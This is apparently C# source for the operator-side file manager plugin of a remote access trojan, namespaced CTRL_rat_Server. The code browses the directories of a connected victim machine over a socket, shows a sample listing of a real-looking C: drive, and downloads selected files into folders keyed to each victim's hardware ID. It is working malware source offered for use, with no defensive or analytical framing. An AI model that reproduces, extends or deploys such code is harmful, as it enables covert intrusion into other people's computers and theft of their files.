using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using CTRL_rat_Server;
namespace Server_plugin_dll
{
    public partial class filemgr : Form
    {
        node client;
        node worker_client;
        CTRL_rat_Server.Main parent;
        string currentdir;
        public filemgr(node _client, CTRL_rat_Server.Main _parent)
        {
            client = _client;
            parent = _parent;
            InitializeComponent();
        }
        public byte[] objecttobyte(object[] e)
        {
            int len = 0;
            byte[] built = new byte[e.Length];
            foreach (int i in e)
            {
                built[len] = Convert.ToByte(i);
                len++;
            }
            return built;
        }
        public void OnMessage(node _client, Dictionary<object, object> response)
        {
            //{"op":"","data":{"files":{"filename":"size"},"dirs":["dirs"]}}
            //{"op":"retpath","data":{"files":{"C:\\\\AMTAG.BIN":"1024","C:\\\\audio.log":"206","C:\\\\bootmgr":"413738","C:\\\\BOOTNXT":"1","C:\\\\DumpStack.log":"8192","C:\\\\DumpStack.log.tmp":"8192","C:\\\\swapfile.sys":"16777216"},"dircs":["C:\\\\$Recycle.Bin","C:\\\\$WINDOWS.~BT","C:\\\\$Windows.~WS","C:\\\\$WinREAgent","C:\\\\11152021_22_17_18","C:\\\\Boot","C:\\\\Documents and Settings","C:\\\\ESD","C:\\\\IntelOptaneData","C:\\\\MinGW","C:\\\\My Web Sites","C:\\\\OneDriveTemp","C:\\\\PerfLogs","C:\\\\Program Files","C:\\\\Program Files (x86)","C:\\\\ProgramData","C:\\\\Recovery","C:\\\\Riot Games","C:\\\\System Volume Information","C:\\\\test","C:\\\\Users","C:\\\\Windows","C:\\\\xampp"]}}
            if (_client.hwid != client.hwid) return;
            if ((string)response["op"] == "retpath")
            {
                listView1.Invoke((MethodInvoker)(() =>
                {
                    var temp1 = client.ObjectToDictionary(response["data"]);
                    var temp2 = client.ObjectToDictionary(temp1["files"]);
                    var temp3 = temp1["dirs"] as object[];
                    listView1.Items.Add(new ListViewItem(new string[] { currentdir, "", "Current Directory" }));
                    listView1.Items.Add(new ListViewItem(new string[] { "..", "", "Directory" }));
                    foreach (var i in temp2.Keys)
                    {
                        string[] row = { Path.GetFileName((string)i), (string)temp2[i], "File" };
                        var listViewItem = new ListViewItem(row);
                        listView1.Items.Add(listViewItem);
                    }
                    foreach (var i in temp3)
                    {
                        string[] row = { (string)i, "", "Directory" };
                        var listViewItem = new ListViewItem(row);
                        listView1.Items.Add(listViewItem);
                    }
                }));
            }
            else if ((string)response["op"] == "retfile") 
            {
                byte[] file = objecttobyte(response["data"] as object[]);
                string filename = (string)response["filename"];
                string savepth = Path.Combine(Directory.GetCurrentDirectory(), client.hwid, filename);
                System.IO.Directory.CreateDirectory(Path.Combine(Directory.GetCurrentDirectory(), client.hwid));
                File.WriteAllBytes(savepth, file);
                new Thread(() => MessageBox.Show(filename + " Downloaded!")).Start();
            }
        }
        private void filemgr_Load(object sender, EventArgs e)
        {
            
        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }
        public void getpath(string path) 
        {
            listView1.Invoke((MethodInvoker)(() =>
            {
                listView1.Items.Clear();
            }));
            currentdir = path;
            var payload = new Dictionary<object, object>();
            payload["op"] = "getpath";
            payload["data"] = currentdir;
            worker_client.Send(worker_client.sock, Encoding.UTF8.GetBytes(worker_client.DictionaryToJson(payload)));
        }
        private void button1_Click(object sender, EventArgs e)
        {
            string clientdlldir = Path.Combine(Directory.GetCurrentDirectory(), "plugin\\Client");
            string serverdlldir = Path.Combine(Directory.GetCurrentDirectory(), "plugin\\Server");
            worker_client = client.get_or_create_worker_node(client.generate_random_id());
            //parent.Send_and_load_dll(worker_client, File.ReadAllBytes(Path.Combine(clientdlldir, "test.dll")));
            getpath("C:\\\\");        
        }

        private void listView1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            string path = listView1.SelectedItems[0].SubItems[0].Text+"\\";
            string type= listView1.SelectedItems[0].SubItems[2].Text;
            if (type != "Directory") return;
            getpath(Path.GetFullPath(Path.Combine(currentdir, path)));
        }

        private void listView1_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button != MouseButtons.Right) return;
            if (listView1.SelectedItems[0].SubItems[2].Text != "File") return;
            contextMenuStrip1.Tag = listView1.SelectedItems[0].SubItems[0].Text;
            contextMenuStrip1.Show(Cursor.Position);
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var payload = new Dictionary<object, object>();
            payload["op"] = "getfile";
            payload["data"] = Path.Combine(currentdir,(string)contextMenuStrip1.Tag);
            worker_client.Send(worker_client.sock, Encoding.UTF8.GetBytes(worker_client.DictionaryToJson(payload)));
        }
    }
}
